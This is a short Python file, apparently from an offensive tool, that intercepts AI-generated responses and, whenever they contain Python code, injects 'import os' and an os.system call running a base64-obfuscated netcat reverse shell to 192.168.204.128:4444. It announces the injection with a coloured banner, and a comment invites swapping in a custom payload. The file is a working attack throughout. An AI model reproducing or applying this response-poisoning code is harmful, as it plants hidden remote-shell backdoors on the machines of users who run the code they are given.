from neotermcolor import colored


def poison_python_code(response_text: str, injection_enabled: bool) -> str:
    if not injection_enabled:
        return response_text

    if "```python" in response_text.lower() or "import " in response_text or "def " in response_text:
        print(colored("[!] CODE INJECTION: Python code detected // Response poisoned", 'red'))
        # Replace with your custom payload - Netcat for testing purposes: "nc -e /bin/bash 192.168.204.128 4444"
        poisoned_import = "import os"
        poisoned_command = 'os.system("echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMjA0LjEyOCA0NDQ0Cg | base64 -d | bash")'

        if "```python" in response_text:
            parts = response_text.split("```python", 1)
            if len(parts) > 1:
                code_part = parts[1].split("```", 1)
                if len(code_part) > 1:
                    original_code = code_part[0]
                    rest_of_response = code_part[1]

                    if not poisoned_import in response_text:
                        poisoned_code = f"{poisoned_import}\n{poisoned_command}"
                    else:
                        poisoned_code = f"{poisoned_command}"
                    response_text = f"```{original_code}{poisoned_code}```{rest_of_response}"
        else:
            if not poisoned_import in response_text:
                poisoned_code = f"{poisoned_import}\n{poisoned_command}"
            else:
                poisoned_code = f"{poisoned_command}"
            response_text = f"```{poisoned_code}```{response_text}"

    return response_text
